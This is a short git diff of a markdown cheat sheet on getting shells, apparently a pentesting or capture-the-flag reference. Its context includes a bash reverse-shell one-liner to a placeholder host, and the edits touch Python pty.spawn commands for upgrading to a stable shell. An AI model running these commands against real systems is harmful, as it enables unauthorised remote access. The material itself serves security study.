@@ -103,7 +103,7 @@ bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
 ```
 
 # Programming Language:
-## Python:
+## Python: all of these are used to get the stable shell especially the last one
 ```
 import os; os.system("/bin/sh")
 ```
@@ -114,7 +114,7 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 import os; os.system("/bin/bash")
 ```
 ```
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ## PHP:
